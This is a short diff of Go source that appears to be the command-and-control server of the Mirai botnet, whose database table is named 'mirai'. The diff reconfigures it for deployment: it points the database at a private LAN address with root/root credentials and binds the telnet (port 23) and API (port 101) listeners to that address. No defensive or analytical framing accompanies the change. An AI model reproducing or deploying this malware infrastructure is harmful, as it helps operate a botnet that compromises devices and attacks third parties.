@@ -7,22 +7,22 @@ import (
     "time"
 )
 
-const DatabaseAddr string   = "127.0.0.1"
+const DatabaseAddr string   = "192.168.1.102"
 const DatabaseUser string   = "root"
-const DatabasePass string   = "password"
+const DatabasePass string   = "root"
 const DatabaseTable string  = "mirai"
 
 var clientList *ClientList = NewClientList()
 var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
 
 func main() {
-    tel, err := net.Listen("tcp", "0.0.0.0:23")
+    tel, err := net.Listen("tcp", "192.168.1.102:23")
     if err != nil {
         fmt.Println(err)
         return
     }
 
-    api, err := net.Listen("tcp", "0.0.0.0:101")
+    api, err := net.Listen("tcp", "192.168.1.102:101")
     if err != nil {
         fmt.Println(err)
         return
